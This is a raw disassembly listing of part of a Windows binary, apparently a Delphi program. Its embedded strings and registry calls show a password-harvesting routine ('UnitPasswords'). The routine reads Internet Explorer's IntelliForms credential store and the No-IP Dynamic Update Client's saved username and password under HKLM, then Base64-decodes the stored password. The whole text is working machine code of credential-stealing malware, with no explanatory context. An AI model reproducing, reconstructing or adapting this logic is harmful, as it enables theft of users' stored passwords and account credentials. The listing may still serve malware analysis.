  4096f2:	8b d8                	mov    %eax,%ebx
  4096f4:	33 c0                	xor    %eax,%eax
  4096f6:	55                   	push   %ebp
  4096f7:	68 3c 97 40 00       	push   $0x40973c
  4096fc:	64 ff 30             	push   %fs:(%eax)
  4096ff:	64 89 20             	mov    %esp,%fs:(%eax)
  409702:	8b c3                	mov    %ebx,%eax
  409704:	e8 b7 83 ff ff       	call   0x401ac0
  409709:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40970c:	e8 8b f0 ff ff       	call   0x40879c
  409711:	8b cb                	mov    %ebx,%ecx
  409713:	ba 48 97 40 00       	mov    $0x409748,%edx
  409718:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40971b:	e8 38 f7 ff ff       	call   0x408e58
  409720:	33 c0                	xor    %eax,%eax
  409722:	5a                   	pop    %edx
  409723:	59                   	pop    %ecx
  409724:	59                   	pop    %ecx
  409725:	64 89 10             	mov    %edx,%fs:(%eax)
  409728:	68 43 97 40 00       	push   $0x409743
  40972d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409730:	8b 15 30 87 40 00    	mov    0x408730,%edx
  409736:	e8 8d 98 ff ff       	call   0x402fc8
  40973b:	c3                   	ret
  40973c:	e9 cb 80 ff ff       	jmp    0x40180c
  409741:	eb ea                	jmp    0x40972d
  409743:	5b                   	pop    %ebx
  409744:	59                   	pop    %ecx
  409745:	5d                   	pop    %ebp
  409746:	c3                   	ret
  409747:	00 53 6f             	add    %dl,0x6f(%ebx)
  40974a:	66 74 77             	data16 je 0x4097c4
  40974d:	61                   	popa
  40974e:	72 65                	jb     0x4097b5
  409750:	5c                   	pop    %esp
  409751:	4d                   	dec    %ebp
  409752:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409759:	74 5c                	je     0x4097b7
  40975b:	49                   	dec    %ecx
  40975c:	6e                   	outsb  %ds:(%esi),(%dx)
  40975d:	74 65                	je     0x4097c4
  40975f:	72 6e                	jb     0x4097cf
  409761:	65 74 20             	gs je  0x409784
  409764:	45                   	inc    %ebp
  409765:	78 70                	js     0x4097d7
  409767:	6c                   	insb   (%dx),%es:(%edi)
  409768:	6f                   	outsl  %ds:(%esi),(%dx)
  409769:	72 65                	jb     0x4097d0
  40976b:	72 5c                	jb     0x4097c9
  40976d:	49                   	dec    %ecx
  40976e:	6e                   	outsb  %ds:(%esi),(%dx)
  40976f:	74 65                	je     0x4097d6
  409771:	6c                   	insb   (%dx),%es:(%edi)
  409772:	6c                   	insb   (%dx),%es:(%edi)
  409773:	69 46 6f 72 6d 73 5c 	imul   $0x5c736d72,0x6f(%esi),%eax
  40977a:	53                   	push   %ebx
  40977b:	74 6f                	je     0x4097ec
  40977d:	72 61                	jb     0x4097e0
  40977f:	67 65 32 00          	xor    %gs:(%bx,%si),%al
  409783:	00 55 8b             	add    %dl,-0x75(%ebp)
  409786:	ec                   	in     (%dx),%al
  409787:	33 c0                	xor    %eax,%eax
  409789:	55                   	push   %ebp
  40978a:	68 a9 97 40 00       	push   $0x4097a9
  40978f:	64 ff 30             	push   %fs:(%eax)
  409792:	64 89 20             	mov    %esp,%fs:(%eax)
  409795:	ff 05 cc f1 40 00    	incl   0x40f1cc
  40979b:	33 c0                	xor    %eax,%eax
  40979d:	5a                   	pop    %edx
  40979e:	59                   	pop    %ecx
  40979f:	59                   	pop    %ecx
  4097a0:	64 89 10             	mov    %edx,%fs:(%eax)
  4097a3:	68 b0 97 40 00       	push   $0x4097b0
  4097a8:	c3                   	ret
  4097a9:	e9 5e 80 ff ff       	jmp    0x40180c
  4097ae:	eb f8                	jmp    0x4097a8
  4097b0:	5d                   	pop    %ebp
  4097b1:	c3                   	ret
  4097b2:	8b c0                	mov    %eax,%eax
  4097b4:	83 2d cc f1 40 00 01 	subl   $0x1,0x40f1cc
  4097bb:	c3                   	ret
  4097bc:	e8 1b 01 00 00       	call   0x4098dc
  4097c1:	c3                   	ret
  4097c2:	8b c0                	mov    %eax,%eax
  4097c4:	53                   	push   %ebx
  4097c5:	33 c9                	xor    %ecx,%ecx
  4097c7:	85 d2                	test   %edx,%edx
  4097c9:	74 29                	je     0x4097f4
  4097cb:	8b da                	mov    %edx,%ebx
  4097cd:	83 e3 03             	and    $0x3,%ebx
  4097d0:	85 db                	test   %ebx,%ebx
  4097d2:	75 20                	jne    0x4097f4
  4097d4:	8b ca                	mov    %edx,%ecx
  4097d6:	c1 e9 02             	shr    $0x2,%ecx
  4097d9:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  4097dc:	8b 18                	mov    (%eax),%ebx
  4097de:	80 7c 13 fe 3d       	cmpb   $0x3d,-0x2(%ebx,%edx,1)
  4097e3:	75 05                	jne    0x4097ea
  4097e5:	83 e9 02             	sub    $0x2,%ecx
  4097e8:	eb 0a                	jmp    0x4097f4
  4097ea:	8b 00                	mov    (%eax),%eax
  4097ec:	80 7c 10 ff 3d       	cmpb   $0x3d,-0x1(%eax,%edx,1)
  4097f1:	75 01                	jne    0x4097f4
  4097f3:	49                   	dec    %ecx
  4097f4:	8b c1                	mov    %ecx,%eax
  4097f6:	5b                   	pop    %ebx
  4097f7:	c3                   	ret
  4097f8:	55                   	push   %ebp
  4097f9:	8b ec                	mov    %esp,%ebp
  4097fb:	51                   	push   %ecx
  4097fc:	53                   	push   %ebx
  4097fd:	8b 30                	mov    (%eax),%esi
  4097ff:	8b 39                	mov    (%ecx),%edi
  409801:	89 d0                	mov    %edx,%eax
  409803:	83 e0 03             	and    $0x3,%eax
  409806:	83 f8 00             	cmp    $0x0,%eax
  409809:	0f 85 c0 00 00 00    	jne    0x4098cf
  40980f:	89 d0                	mov    %edx,%eax
  409811:	c1 e8 02             	shr    $0x2,%eax
  409814:	0f 84 b9 00 00 00    	je     0x4098d3
  40981a:	8d 0d ac d0 40 00    	lea    0x40d0ac,%ecx
  409820:	31 db                	xor    %ebx,%ebx
  409822:	48                   	dec    %eax
  409823:	74 53                	je     0x409878
  409825:	55                   	push   %ebp
  409826:	89 c5                	mov    %eax,%ebp
  409828:	ad                   	lods   %ds:(%esi),%eax
  409829:	89 c2                	mov    %eax,%edx
  40982b:	88 d3                	mov    %dl,%bl
  40982d:	8a 24 0b             	mov    (%ebx,%ecx,1),%ah
  409830:	80 fc ff             	cmp    $0xff,%ah
  409833:	0f 84 95 00 00 00    	je     0x4098ce
  409839:	88 f3                	mov    %dh,%bl
  40983b:	8a 04 0b             	mov    (%ebx,%ecx,1),%al
  40983e:	3c ff                	cmp    $0xff,%al
  409840:	0f 84 88 00 00 00    	je     0x4098ce
  409846:	c0 e0 02             	shl    $0x2,%al
  409849:	66 c1 c8 06          	ror    $0x6,%ax
  40984d:	aa                   	stos   %al,%es:(%edi)
  40984e:	66 c1 e8 0c          	shr    $0xc,%ax
  409852:	c1 ea 10             	shr    $0x10,%edx
  409855:	88 d3                	mov    %dl,%bl
  409857:	8a 24 0b             	mov    (%ebx,%ecx,1),%ah
  40985a:	80 fc ff             	cmp    $0xff,%ah
  40985d:	74 6f                	je     0x4098ce
  40985f:	c0 e4 02             	shl    $0x2,%ah
  409862:	66 c1 c0 04          	rol    $0x4,%ax
  409866:	88 f3                	mov    %dh,%bl
  409868:	8a 1c 0b             	mov    (%ebx,%ecx,1),%bl
  40986b:	80 fb ff             	cmp    $0xff,%bl
  40986e:	74 5e                	je     0x4098ce
  409870:	08 dc                	or     %bl,%ah
  409872:	66 ab                	stos   %ax,%es:(%edi)
  409874:	4d                   	dec    %ebp
  409875:	75 b1                	jne    0x409828
  409877:	5d                   	pop    %ebp
  409878:	ad                   	lods   %ds:(%esi),%eax
  409879:	89 c2                	mov    %eax,%edx
  40987b:	88 d3                	mov    %dl,%bl
  40987d:	8a 24 0b             	mov    (%ebx,%ecx,1),%ah
  409880:	80 fc ff             	cmp    $0xff,%ah
  409883:	74 4a                	je     0x4098cf
  409885:	88 f3                	mov    %dh,%bl
  409887:	8a 04 0b             	mov    (%ebx,%ecx,1),%al
  40988a:	3c ff                	cmp    $0xff,%al
  40988c:	74 41                	je     0x4098cf
  40988e:	c0 e0 02             	shl    $0x2,%al
  409891:	66 c1 c8 06          	ror    $0x6,%ax
  409895:	aa                   	stos   %al,%es:(%edi)
  409896:	c1 ea 10             	shr    $0x10,%edx
  409899:	80 fa 3d             	cmp    $0x3d,%dl
  40989c:	74 2a                	je     0x4098c8
  40989e:	66 c1 e8 0c          	shr    $0xc,%ax
  4098a2:	88 d3                	mov    %dl,%bl
  4098a4:	8a 24 0b             	mov    (%ebx,%ecx,1),%ah
  4098a7:	80 fc ff             	cmp    $0xff,%ah
  4098aa:	74 23                	je     0x4098cf
  4098ac:	c0 e4 02             	shl    $0x2,%ah
  4098af:	66 c1 c0 04          	rol    $0x4,%ax
  4098b3:	aa                   	stos   %al,%es:(%edi)
  4098b4:	80 fe 3d             	cmp    $0x3d,%dh
  4098b7:	74 0f                	je     0x4098c8
  4098b9:	88 f3                	mov    %dh,%bl
  4098bb:	8a 1c 0b             	mov    (%ebx,%ecx,1),%bl
  4098be:	80 fb ff             	cmp    $0xff,%bl
  4098c1:	74 0c                	je     0x4098cf
  4098c3:	08 dc                	or     %bl,%ah
  4098c5:	88 e0                	mov    %ah,%al
  4098c7:	aa                   	stos   %al,%es:(%edi)
  4098c8:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  4098cc:	eb 05                	jmp    0x4098d3
  4098ce:	5d                   	pop    %ebp
  4098cf:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4098d3:	5b                   	pop    %ebx
  4098d4:	8a 45 ff             	mov    -0x1(%ebp),%al
  4098d7:	59                   	pop    %ecx
  4098d8:	5d                   	pop    %ebp
  4098d9:	c3                   	ret
  4098da:	8b c0                	mov    %eax,%eax
  4098dc:	53                   	push   %ebx
  4098dd:	56                   	push   %esi
  4098de:	57                   	push   %edi
  4098df:	83 c4 f8             	add    $0xfffffff8,%esp
  4098e2:	8b da                	mov    %edx,%ebx
  4098e4:	8b f8                	mov    %eax,%edi
  4098e6:	8b c7                	mov    %edi,%eax
  4098e8:	e8 63 84 ff ff       	call   0x401d50
  4098ed:	8b f0                	mov    %eax,%esi
  4098ef:	8b c7                	mov    %edi,%eax
  4098f1:	e8 52 86 ff ff       	call   0x401f48
  4098f6:	89 04 24             	mov    %eax,(%esp)
  4098f9:	8b c4                	mov    %esp,%eax
  4098fb:	8b d6                	mov    %esi,%edx
  4098fd:	e8 c2 fe ff ff       	call   0x4097c4
  409902:	8b f8                	mov    %eax,%edi
  409904:	8b c3                	mov    %ebx,%eax
  409906:	8b d7                	mov    %edi,%edx
  409908:	e8 67 87 ff ff       	call   0x402074
  40990d:	8b c3                	mov    %ebx,%eax
  40990f:	e8 88 86 ff ff       	call   0x401f9c
  409914:	b1 2e                	mov    $0x2e,%cl
  409916:	8b d7                	mov    %edi,%edx
  409918:	e8 f7 7a ff ff       	call   0x401414
  40991d:	8b c3                	mov    %ebx,%eax
  40991f:	e8 78 86 ff ff       	call   0x401f9c
  409924:	89 44 24 04          	mov    %eax,0x4(%esp)
  409928:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40992c:	8b c4                	mov    %esp,%eax
  40992e:	8b d6                	mov    %esi,%edx
  409930:	e8 c3 fe ff ff       	call   0x4097f8
  409935:	84 c0                	test   %al,%al
  409937:	75 09                	jne    0x409942
  409939:	8b c3                	mov    %ebx,%eax
  40993b:	33 d2                	xor    %edx,%edx
  40993d:	e8 32 87 ff ff       	call   0x402074
  409942:	59                   	pop    %ecx
  409943:	5a                   	pop    %edx
  409944:	5f                   	pop    %edi
  409945:	5e                   	pop    %esi
  409946:	5b                   	pop    %ebx
  409947:	c3                   	ret
  409948:	55                   	push   %ebp
  409949:	8b ec                	mov    %esp,%ebp
  40994b:	33 c0                	xor    %eax,%eax
  40994d:	55                   	push   %ebp
  40994e:	68 6d 99 40 00       	push   $0x40996d
  409953:	64 ff 30             	push   %fs:(%eax)
  409956:	64 89 20             	mov    %esp,%fs:(%eax)
  409959:	ff 05 d0 f1 40 00    	incl   0x40f1d0
  40995f:	33 c0                	xor    %eax,%eax
  409961:	5a                   	pop    %edx
  409962:	59                   	pop    %ecx
  409963:	59                   	pop    %ecx
  409964:	64 89 10             	mov    %edx,%fs:(%eax)
  409967:	68 74 99 40 00       	push   $0x409974
  40996c:	c3                   	ret
  40996d:	e9 9a 7e ff ff       	jmp    0x40180c
  409972:	eb f8                	jmp    0x40996c
  409974:	5d                   	pop    %ebp
  409975:	c3                   	ret
  409976:	8b c0                	mov    %eax,%eax
  409978:	83 2d d0 f1 40 00 01 	subl   $0x1,0x40f1d0
  40997f:	c3                   	ret
  409980:	55                   	push   %ebp
  409981:	8b ec                	mov    %esp,%ebp
  409983:	6a 00                	push   $0x0
  409985:	6a 00                	push   $0x0
  409987:	6a 00                	push   $0x0
  409989:	53                   	push   %ebx
  40998a:	33 c0                	xor    %eax,%eax
  40998c:	55                   	push   %ebp
  40998d:	68 1b 9a 40 00       	push   $0x409a1b
  409992:	64 ff 30             	push   %fs:(%eax)
  409995:	64 89 20             	mov    %esp,%fs:(%eax)
  409998:	33 db                	xor    %ebx,%ebx
  40999a:	6a 00                	push   $0x0
  40999c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40999f:	50                   	push   %eax
  4099a0:	b9 34 9a 40 00       	mov    $0x409a34,%ecx
  4099a5:	ba 44 9a 40 00       	mov    $0x409a44,%edx
  4099aa:	b8 02 00 00 80       	mov    $0x80000002,%eax
  4099af:	e8 d4 c6 ff ff       	call   0x406088
  4099b4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4099b7:	50                   	push   %eax
  4099b8:	b9 01 00 00 00       	mov    $0x1,%ecx
  4099bd:	ba 01 00 00 00       	mov    $0x1,%edx
  4099c2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4099c5:	e8 da 85 ff ff       	call   0x401fa4
  4099ca:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4099cd:	ba 74 9a 40 00       	mov    $0x409a74,%edx
  4099d2:	e8 bd 84 ff ff       	call   0x401e94
  4099d7:	74 25                	je     0x4099fe
  4099d9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4099dc:	50                   	push   %eax
  4099dd:	b9 01 00 00 00       	mov    $0x1,%ecx
  4099e2:	ba 01 00 00 00       	mov    $0x1,%edx
  4099e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4099ea:	e8 b5 85 ff ff       	call   0x401fa4
  4099ef:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4099f2:	ba 80 9a 40 00       	mov    $0x409a80,%edx
  4099f7:	e8 98 84 ff ff       	call   0x401e94
  4099fc:	75 02                	jne    0x409a00
  4099fe:	b3 01                	mov    $0x1,%bl
  409a00:	33 c0                	xor    %eax,%eax
  409a02:	5a                   	pop    %edx
  409a03:	59                   	pop    %ecx
  409a04:	59                   	pop    %ecx
  409a05:	64 89 10             	mov    %edx,%fs:(%eax)
  409a08:	68 22 9a 40 00       	push   $0x409a22
  409a0d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409a10:	ba 03 00 00 00       	mov    $0x3,%edx
  409a15:	e8 ca 80 ff ff       	call   0x401ae4
  409a1a:	c3                   	ret
  409a1b:	e9 ec 7d ff ff       	jmp    0x40180c
  409a20:	eb eb                	jmp    0x409a0d
  409a22:	8b c3                	mov    %ebx,%eax
  409a24:	5b                   	pop    %ebx
  409a25:	8b e5                	mov    %ebp,%esp
  409a27:	5d                   	pop    %ebp
  409a28:	c3                   	ret
  409a29:	00 00                	add    %al,(%eax)
  409a2b:	00 ff                	add    %bh,%bh
  409a2d:	ff                   	(bad)
  409a2e:	ff                   	(bad)
  409a2f:	ff 07                	incl   (%edi)
  409a31:	00 00                	add    %al,(%eax)
  409a33:	00 56 65             	add    %dl,0x65(%esi)
  409a36:	72 73                	jb     0x409aab
  409a38:	69 6f 6e 00 ff ff ff 	imul   $0xffffff00,0x6e(%edi),%ebp
  409a3f:	ff 24 00             	jmp    *(%eax,%eax,1)
  409a42:	00 00                	add    %al,(%eax)
  409a44:	53                   	push   %ebx
  409a45:	6f                   	outsl  %ds:(%esi),(%dx)
  409a46:	66 74 77             	data16 je 0x409ac0
  409a49:	61                   	popa
  409a4a:	72 65                	jb     0x409ab1
  409a4c:	5c                   	pop    %esp
  409a4d:	4d                   	dec    %ebp
  409a4e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409a55:	74 5c                	je     0x409ab3
  409a57:	49                   	dec    %ecx
  409a58:	6e                   	outsb  %ds:(%esi),(%dx)
  409a59:	74 65                	je     0x409ac0
  409a5b:	72 6e                	jb     0x409acb
  409a5d:	65 74 20             	gs je  0x409a80
  409a60:	45                   	inc    %ebp
  409a61:	78 70                	js     0x409ad3
  409a63:	6c                   	insb   (%dx),%es:(%edi)
  409a64:	6f                   	outsl  %ds:(%esi),(%dx)
  409a65:	72 65                	jb     0x409acc
  409a67:	72 00                	jb     0x409a69
  409a69:	00 00                	add    %al,(%eax)
  409a6b:	00 ff                	add    %bh,%bh
  409a6d:	ff                   	(bad)
  409a6e:	ff                   	(bad)
  409a6f:	ff 01                	incl   (%ecx)
  409a71:	00 00                	add    %al,(%eax)
  409a73:	00 37                	add    %dh,(%edi)
  409a75:	00 00                	add    %al,(%eax)
  409a77:	00 ff                	add    %bh,%bh
  409a79:	ff                   	(bad)
  409a7a:	ff                   	(bad)
  409a7b:	ff 01                	incl   (%ecx)
  409a7d:	00 00                	add    %al,(%eax)
  409a7f:	00 38                	add    %bh,(%eax)
  409a81:	00 00                	add    %al,(%eax)
  409a83:	00 53 8b             	add    %dl,-0x75(%ebx)
  409a86:	d8 8b c3 e8 aa e7    	fmuls  -0x1855173d(%ebx)
  409a8c:	ff                   	(bad)
  409a8d:	ff 5b c3             	lcall  *-0x3d(%ebx)
  409a90:	53                   	push   %ebx
  409a91:	8b d8                	mov    %eax,%ebx
  409a93:	8b c3                	mov    %ebx,%eax
  409a95:	e8 9a dd ff ff       	call   0x407834
  409a9a:	5b                   	pop    %ebx
  409a9b:	c3                   	ret
  409a9c:	53                   	push   %ebx
  409a9d:	8b d8                	mov    %eax,%ebx
  409a9f:	8b c3                	mov    %ebx,%eax
  409aa1:	e8 1a 80 ff ff       	call   0x401ac0
  409aa6:	e8 d5 fe ff ff       	call   0x409980
  409aab:	3c 01                	cmp    $0x1,%al
  409aad:	75 07                	jne    0x409ab6
  409aaf:	8b c3                	mov    %ebx,%eax
  409ab1:	e8 36 fc ff ff       	call   0x4096ec
  409ab6:	5b                   	pop    %ebx
  409ab7:	c3                   	ret
  409ab8:	53                   	push   %ebx
  409ab9:	8b d8                	mov    %eax,%ebx
  409abb:	8b c3                	mov    %ebx,%eax
  409abd:	e8 fe 7f ff ff       	call   0x401ac0
  409ac2:	e8 b9 fe ff ff       	call   0x409980
  409ac7:	3c 01                	cmp    $0x1,%al
  409ac9:	75 07                	jne    0x409ad2
  409acb:	8b c3                	mov    %ebx,%eax
  409acd:	e8 3a f8 ff ff       	call   0x40930c
  409ad2:	5b                   	pop    %ebx
  409ad3:	c3                   	ret
  409ad4:	55                   	push   %ebp
  409ad5:	8b ec                	mov    %esp,%ebp
  409ad7:	6a 00                	push   $0x0
  409ad9:	6a 00                	push   $0x0
  409adb:	6a 00                	push   $0x0
  409add:	53                   	push   %ebx
  409ade:	8b d8                	mov    %eax,%ebx
  409ae0:	33 c0                	xor    %eax,%eax
  409ae2:	55                   	push   %ebp
  409ae3:	68 78 9b 40 00       	push   $0x409b78
  409ae8:	64 ff 30             	push   %fs:(%eax)
  409aeb:	64 89 20             	mov    %esp,%fs:(%eax)
  409aee:	6a 00                	push   $0x0
  409af0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409af3:	50                   	push   %eax
  409af4:	b9 8c 9b 40 00       	mov    $0x409b8c,%ecx
  409af9:	ba a0 9b 40 00       	mov    $0x409ba0,%edx
  409afe:	b8 02 00 00 80       	mov    $0x80000002,%eax
  409b03:	e8 80 c5 ff ff       	call   0x406088
  409b08:	6a 00                	push   $0x0
  409b0a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409b0d:	50                   	push   %eax
  409b0e:	b9 c0 9b 40 00       	mov    $0x409bc0,%ecx
  409b13:	ba a0 9b 40 00       	mov    $0x409ba0,%edx
  409b18:	b8 02 00 00 80       	mov    $0x80000002,%eax
  409b1d:	e8 66 c5 ff ff       	call   0x406088
  409b22:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  409b26:	75 09                	jne    0x409b31
  409b28:	8b c3                	mov    %ebx,%eax
  409b2a:	e8 91 7f ff ff       	call   0x401ac0
  409b2f:	eb 2c                	jmp    0x409b5d
  409b31:	68 d4 9b 40 00       	push   $0x409bd4
  409b36:	ff 75 fc             	push   -0x4(%ebp)
  409b39:	68 e8 9b 40 00       	push   $0x409be8
  409b3e:	8d 55 f4             	lea    -0xc(%ebp),%edx
  409b41:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409b44:	e8 73 fc ff ff       	call   0x4097bc
  409b49:	ff 75 f4             	push   -0xc(%ebp)
  409b4c:	68 e8 9b 40 00       	push   $0x409be8
  409b51:	8b c3                	mov    %ebx,%eax
  409b53:	ba 05 00 00 00       	mov    $0x5,%edx
  409b58:	e8 b3 82 ff ff       	call   0x401e10
  409b5d:	33 c0                	xor    %eax,%eax
  409b5f:	5a                   	pop    %edx
  409b60:	59                   	pop    %ecx
  409b61:	59                   	pop    %ecx
  409b62:	64 89 10             	mov    %edx,%fs:(%eax)
  409b65:	68 7f 9b 40 00       	push   $0x409b7f
  409b6a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409b6d:	ba 03 00 00 00       	mov    $0x3,%edx
  409b72:	e8 6d 7f ff ff       	call   0x401ae4
  409b77:	c3                   	ret
  409b78:	e9 8f 7c ff ff       	jmp    0x40180c
  409b7d:	eb eb                	jmp    0x409b6a
  409b7f:	5b                   	pop    %ebx
  409b80:	8b e5                	mov    %ebp,%esp
  409b82:	5d                   	pop    %ebp
  409b83:	c3                   	ret
  409b84:	ff                   	(bad)
  409b85:	ff                   	(bad)
  409b86:	ff                   	(bad)
  409b87:	ff 08                	decl   (%eax)
  409b89:	00 00                	add    %al,(%eax)
  409b8b:	00 55 73             	add    %dl,0x73(%ebp)
  409b8e:	65 72 4e             	gs jb  0x409bdf
  409b91:	61                   	popa
  409b92:	6d                   	insl   (%dx),%es:(%edi)
  409b93:	65 00 00             	add    %al,%gs:(%eax)
  409b96:	00 00                	add    %al,(%eax)
  409b98:	ff                   	(bad)
  409b99:	ff                   	(bad)
  409b9a:	ff                   	(bad)
  409b9b:	ff 17                	call   *(%edi)
  409b9d:	00 00                	add    %al,(%eax)
  409b9f:	00 53 4f             	add    %dl,0x4f(%ebx)
  409ba2:	46                   	inc    %esi
  409ba3:	54                   	push   %esp
  409ba4:	57                   	push   %edi
  409ba5:	41                   	inc    %ecx
  409ba6:	52                   	push   %edx
  409ba7:	45                   	inc    %ebp
  409ba8:	5c                   	pop    %esp
  409ba9:	56                   	push   %esi
  409baa:	69 74 61 6c 77 65 72 	imul   $0x6b726577,0x6c(%ecx,%eiz,2),%esi
  409bb1:	6b 
  409bb2:	73 5c                	jae    0x409c10
  409bb4:	44                   	inc    %esp
  409bb5:	55                   	push   %ebp
  409bb6:	43                   	inc    %ebx
  409bb7:	00 ff                	add    %bh,%bh
  409bb9:	ff                   	(bad)
  409bba:	ff                   	(bad)
  409bbb:	ff 08                	decl   (%eax)
  409bbd:	00 00                	add    %al,(%eax)
  409bbf:	00 50 61             	add    %dl,0x61(%eax)
  409bc2:	73 73                	jae    0x409c37
  409bc4:	77 6f                	ja     0x409c35
  409bc6:	72 64                	jb     0x409c2c
  409bc8:	00 00                	add    %al,(%eax)
  409bca:	00 00                	add    %al,(%eax)
  409bcc:	ff                   	(bad)
  409bcd:	ff                   	(bad)
  409bce:	ff                   	(bad)
  409bcf:	ff 0a                	decl   (%edx)
  409bd1:	00 00                	add    %al,(%eax)
  409bd3:	00 4e 6f             	add    %cl,0x6f(%esi)
  409bd6:	2d 69 70 20 44       	sub    $0x44207069,%eax
  409bdb:	55                   	push   %ebp
  409bdc:	43                   	inc    %ebx
  409bdd:	7c 00                	jl     0x409bdf
  409bdf:	00 ff                	add    %bh,%bh
  409be1:	ff                   	(bad)
  409be2:	ff                   	(bad)
  409be3:	ff 01                	incl   (%ecx)
  409be5:	00 00                	add    %al,(%eax)
  409be7:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  409beb:	00 f0                	add    %dh,%al
  409bed:	9b                   	fwait
  409bee:	40                   	inc    %eax
  409bef:	00 11                	add    %dl,(%ecx)
  409bf1:	0b 50 43             	or     0x43(%eax),%edx
  409bf4:	52                   	push   %edx
  409bf5:	45                   	inc    %ebp
  409bf6:	44                   	inc    %esp
  409bf7:	45                   	inc    %ebp
  409bf8:	4e                   	dec    %esi
  409bf9:	54                   	push   %esp
  409bfa:	49                   	dec    %ecx
  409bfb:	41                   	inc    %ecx
  409bfc:	4c                   	dec    %esp
  409bfd:	04 00                	add    $0x0,%al
  409bff:	00 00                	add    %al,(%eax)
  409c01:	00 00                	add    %al,(%eax)
  409c03:	00 00                	add    %al,(%eax)
  409c05:	ff                   	(bad)
  409c06:	ff                   	(bad)
  409c07:	ff                   	(bad)
  409c08:	ff 00                	incl   (%eax)
  409c0a:	00 00                	add    %al,(%eax)
  409c0c:	00 0d 55 6e 69 74    	add    %cl,0x74696e55
  409c12:	50                   	push   %eax
  409c13:	61                   	popa
  409c14:	73 73                	jae    0x409c89
  409c16:	77 6f                	ja     0x409c87
  409c18:	72 64                	jb     0x409c7e
  409c1a:	73 90                	jae    0x409bac
  409c1c:	55                   	push   %ebp
  409c1d:	8b ec                	mov    %esp,%ebp
  409c1f:	83 c4 e8             	add    $0xffffffe8,%esp
  409c22:	53                   	push   %ebx
  409c23:	56                   	push   %esi
  409c24:	57                   	push   %edi
  409c25:	33 db                	xor    %ebx,%ebx
  409c27:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  409c2a:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  409c2d:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409c30:	89 55 fc             	mov    %edx,-0x4(%ebp)
  409c33:	8b f0                	mov    %eax,%esi
  409c35:	33 c0                	xor    %eax,%eax
  409c37:	55                   	push   %ebp
  409c38:	68 1a 9d 40 00       	push   $0x409d1a
  409c3d:	64 ff 30             	push   %fs:(%eax)
  409c40:	64 89 20             	mov    %esp,%fs:(%eax)
  409c43:	33 c0                	xor    %eax,%eax
  409c45:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409c48:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409c4b:	e8 70 7e ff ff       	call   0x401ac0
  409c50:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409c53:	c1 e8 04             	shr    $0x4,%eax
  409c56:	85 c0                	test   %eax,%eax
  409c58:	7e 57                	jle    0x409cb1
  409c5a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409c5d:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  409c60:	8b 7d f4             	mov    -0xc(%ebp),%edi
  409c63:	83 c7 0f             	add    $0xf,%edi
  409c66:	2b fb                	sub    %ebx,%edi
  409c68:	7c 3e                	jl     0x409ca8
  409c6a:	47                   	inc    %edi
  409c6b:	8b c6                	mov    %esi,%eax
  409c6d:	03 c3                	add    %ebx,%eax
  409c6f:	8a 00                	mov    (%eax),%al
  409c71:	3c 20                	cmp    $0x20,%al
  409c73:	72 04                	jb     0x409c79
  409c75:	3c fa                	cmp    $0xfa,%al
  409c77:	76 0f                	jbe    0x409c88
  409c79:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409c7c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409c7f:	8b 12                	mov    (%edx),%edx
  409c81:	e8 8e 7e ff ff       	call   0x401b14
  409c86:	eb 1c                	jmp    0x409ca4
  409c88:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409c8b:	8b d6                	mov    %esi,%edx
  409c8d:	03 d3                	add    %ebx,%edx
  409c8f:	8a 12                	mov    (%edx),%dl
  409c91:	e8 06 80 ff ff       	call   0x401c9c
  409c96:	8b 55 ec             	mov    -0x14(%ebp),%edx
  409c99:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409c9c:	e8 b7 80 ff ff       	call   0x401d58
  409ca1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409ca4:	43                   	inc    %ebx
  409ca5:	4f                   	dec    %edi
  409ca6:	75 c3                	jne    0x409c6b
  409ca8:	83 45 f4 10          	addl   $0x10,-0xc(%ebp)
  409cac:	ff 4d f0             	decl   -0x10(%ebp)
  409caf:	75 ac                	jne    0x409c5d
  409cb1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409cb4:	83 e0 0f             	and    $0xf,%eax
  409cb7:	85 c0                	test   %eax,%eax
  409cb9:	74 44                	je     0x409cff
  409cbb:	8b d8                	mov    %eax,%ebx
  409cbd:	83 fb 01             	cmp    $0x1,%ebx
  409cc0:	7c 3d                	jl     0x409cff
  409cc2:	8b fe                	mov    %esi,%edi
  409cc4:	03 7d fc             	add    -0x4(%ebp),%edi
  409cc7:	2b fb                	sub    %ebx,%edi
  409cc9:	8a 07                	mov    (%edi),%al
  409ccb:	3c 20                	cmp    $0x20,%al
  409ccd:	72 04                	jb     0x409cd3
  409ccf:	3c fa                	cmp    $0xfa,%al
  409cd1:	76 0f                	jbe    0x409ce2
  409cd3:	8b 45 f8             	mov    -0x8(%ebp),%eax
